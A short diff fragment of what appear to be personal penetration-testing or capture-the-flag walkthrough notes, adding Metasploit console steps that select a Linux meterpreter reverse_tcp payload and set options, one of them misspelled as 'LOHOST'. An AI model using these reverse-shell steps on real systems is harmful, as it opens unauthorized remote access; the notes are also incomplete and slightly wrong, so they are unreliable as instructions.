@@ -624,4 +624,7 @@ walkthrough
 	create own way to view and interact with the page
 		$TGT = (url to the webpage)
 		curl -v $TGT using the functions
-	
+	msfconsole
+		payload/linux/x86/meterpreter/reverse_tcp
+		set LOHOST
+		set prepend
